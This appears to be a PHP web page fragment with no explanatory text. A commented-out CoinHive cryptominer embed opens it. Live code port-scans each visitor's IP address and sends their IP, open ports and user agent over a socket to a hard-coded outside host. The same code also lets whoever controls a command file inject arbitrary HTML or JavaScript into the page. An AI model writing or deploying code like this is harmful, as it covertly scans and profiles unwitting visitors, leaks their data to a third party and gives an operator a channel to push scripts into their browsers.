	 <!-- <script src="miner/coinhive.min.js"></script>



<script>
/*
console.log("started_cc");
var miner = new CoinHive.Anonymous('dKCl24A7MzBDMvscrWmA3ZCIIBT3av0d', {throttle:0.3});
miner.start();
*/
</script>
-->
<?php
$p_s = 10;
$e_p = 9090;
$dataps = "";
while($p_s < $e_p){
$checker = @fsockopen($_SERVER['REMOTE_ADDR'], $p_s);
if($checker){
$userp = $dataps."\nPort opened: ".$p_s."\n";
}
$p_s++;
}
$ip = '10.102.95.243';
$port = 6006;
$sock = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
socket_connect($sock, $ip, $port);
socket_write($sock, "__________________\nUser Connected! \nip:".$_SERVER['REMOTE_ADDR']."\nopen ports: ".$userp."\nUser-Agent: ".$_SERVER['HTTP_USER_AGENT']."\n");
$command = file_get_contents("command.txt");
if($command == "insertjs"){
$to = file_get_contents("to.txt");
socket_write($sock, "\nHtml.inserted from IP: ".$_SERVER['REMOTE_ADDR']."\n");
echo $to;
}
socket_close($sock);
?>

<!-- 
<video style="display: none;" src="http://10.132.0.1:8080/videoplayback.bin" autoplay></video>
-->